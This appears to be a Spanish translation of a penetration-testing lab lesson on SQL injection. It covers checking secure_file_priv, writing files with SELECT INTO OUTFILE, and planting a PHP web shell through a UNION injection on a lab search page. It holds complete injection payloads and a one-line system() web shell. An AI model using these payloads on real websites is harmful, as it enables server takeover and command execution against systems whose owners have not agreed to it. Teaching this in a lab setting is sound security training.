
## Write File Privileges

Para poder escribir archivos en el servidor back-end usando una base de datos MySQL, necesitamos tres cosas:

1. Usuario con el privilegio `FILE` habilitado.
2. Variable global `secure_file_priv` de MySQL no habilitada.
3. Acceso de escritura a la ubicación donde queremos escribir en el servidor back-end.

Ya hemos comprobado que nuestro usuario actual tiene el privilegio `FILE` necesario para escribir archivos. Ahora debemos verificar si la base de datos MySQL tiene ese privilegio. Esto se puede hacer comprobando la variable global `secure_file_priv`.

### secure_file_priv

La variable [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) se usa para determinar desde dónde leer/escribir archivos. Un valor vacío nos permite leer archivos de todo el sistema de archivos. De lo contrario, si se establece un directorio específico, solo podemos leer desde la carpeta especificada por la variable. Por otro lado, `NULL` significa que no podemos leer/escribir desde ningún directorio. MariaDB tiene esta variable configurada como vacía por defecto, lo que nos permite leer/escribir en cualquier archivo si el usuario tiene el privilegio `FILE`. Sin embargo, `MySQL` usa `/var/lib/mysql-files` como la carpeta predeterminada. Esto significa que leer archivos a través de una inyección `MySQL` no es posible con la configuración predeterminada. Aún peor, algunas configuraciones modernas predeterminan a `NULL`, lo que significa que no podemos leer/escribir archivos en ningún lugar dentro del sistema.

Entonces, veamos cómo podemos averiguar el valor de `secure_file_priv`. Dentro de `MySQL`, podemos usar la siguiente consulta para obtener el valor de esta variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Sin embargo, como estamos usando una inyección `UNION`, tenemos que obtener el valor usando una declaración `SELECT`. Esto no debería ser un problema, ya que todas las variables y la mayoría de las configuraciones están almacenadas dentro de la base de datos `INFORMATION_SCHEMA`. Las variables globales de `MySQL` están almacenadas en una tabla llamada [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), y según la documentación, esta tabla tiene dos columnas `variable_name` y `variable_value`.

Tenemos que seleccionar estas dos columnas de esa tabla en la base de datos `INFORMATION_SCHEMA`. Hay cientos de variables globales en una configuración de MySQL, y no queremos recuperar todas. Entonces filtraremos los resultados para mostrar solo la variable `secure_file_priv`, usando la cláusula `WHERE` que aprendimos en una sección anterior.

La consulta SQL final es la siguiente:

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name="secure_file_priv"
```

Entonces, similar a otras consultas de inyección `UNION`, podemos obtener el resultado de la consulta anterior con el siguiente payload. Recuerda agregar dos columnas más `1` y `4` como datos basura para tener un total de 4 columnas:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

`http://SERVER_IP:PORT/search.php?port_code=cn`

![](https://academy.hackthebox.com/storage/modules/33/secure_file_priv.jpg)

Y el resultado muestra que el valor de `secure_file_priv` está vacío, lo que significa que podemos leer/escribir archivos en cualquier ubicación.

---

## SELECT INTO OUTFILE

Ahora que hemos confirmado que nuestro usuario debería escribir archivos en el servidor back-end, intentemos hacerlo usando la declaración `SELECT .. INTO OUTFILE`. La declaración [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) se puede usar para escribir datos de consultas select en archivos. Esto generalmente se usa para exportar datos de tablas.

Para usarlo, podemos agregar `INTO OUTFILE '...'` después de nuestra consulta para exportar los resultados al archivo que especificamos. El siguiente ejemplo guarda la salida de la tabla `users` en el archivo `/tmp/credentials`:

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

Si vamos al servidor back-end y usamos `cat` en el archivo, vemos que el contenido de la tabla:

```sh
cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

También es posible seleccionar directamente cadenas en archivos, lo que nos permite escribir archivos arbitrarios en el servidor back-end.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

Cuando hacemos `cat` del archivo, vemos ese texto:

```sh
cat /tmp/test.txt 

this is a test
```

```sh
ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

Como podemos ver arriba, el archivo `test.txt` se creó correctamente y es propiedad del usuario `mysql`.

Tip: Las exportaciones avanzadas de archivos utilizan la función 'FROM_BASE64("base64_data")' para poder escribir archivos largos/avanzados, incluidos datos binarios.

---

## Writing Files through SQL Injection

Intentemos escribir un archivo de texto en la raíz web y verificar si tenemos permisos de escritura. La consulta a continuación debería escribir `file written successfully!` en el archivo `/var/www/html/proof.txt`, al cual luego podemos acceder en la aplicación web:

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

**Nota:** Para escribir una web shell, debemos conocer el directorio web base del servidor web (es decir, la raíz web). Una forma de encontrarlo es usar `load_file` para leer la configuración del servidor, como la configuración de Apache que se encuentra en `/etc/apache2/apache2.conf`, la configuración de Nginx en `/etc/nginx/nginx.conf`, o la configuración de IIS en `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, o podemos buscar en línea otras posibles ubicaciones de configuración. Además, podemos ejecutar un escaneo de fuzzing e intentar escribir archivos en diferentes posibles raíces web, usando [esta wordlist para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) o [esta wordlist para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finalmente, si nada de lo anterior funciona, podemos usar errores del servidor que se nos muestren e intentar encontrar el directorio web de esa manera.

El payload de inyección `UNION` sería el siguiente:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

`http://SERVER_IP:PORT/search.php?port_code=cn`

![](https://academy.hackthebox.com/storage/modules/33/write_proof.png)

No vemos ningún error en la página, lo que indica que la consulta tuvo éxito. Comprobando el archivo `proof.txt` en la raíz web, vemos que efectivamente existe:

`http://SERVER_IP:PORT/proof.txt`

![](https://academy.hackthebox.com/storage/modules/33/write_proof_text.png)

Nota: Vemos la cadena que volcamos junto con '1', '3' antes de ella y '4' después de ella. Esto se debe a que se escribió el resultado completo de la consulta `UNION` en el archivo. Para hacer la salida más limpia, podemos usar "" en lugar de números.

---

## Writing a Web Shell

Habiendo confirmado los permisos de escritura, podemos proceder a escribir un web shell en la carpeta raíz web. Podemos escribir el siguiente web shell en PHP para poder ejecutar comandos directamente en el servidor back-end:

```php
<?php system($_REQUEST[0]); ?>
```

Podemos reutilizar nuestro payload de inyección `UNION` anterior, y cambiar la cadena a la anterior, y el nombre del archivo a `shell.php`:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

`http://SERVER_IP:PORT/search.php?port_code=cn`

![](https://academy.hackthebox.com/storage/modules/33/write_shell.png)

Una vez más, no vemos ningún error, lo que significa que probablemente la escritura del archivo funcionó. Esto se puede verificar navegando al archivo `/shell.php` y ejecutando comandos a través del parámetro `0`, con `?0=id` en nuestra URL:

`http://SERVER_IP:PORT/shell.php?0=id`

![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

La salida del comando `id` confirma que tenemos ejecución de código y estamos ejecutando como el usuario `www-data`.

---

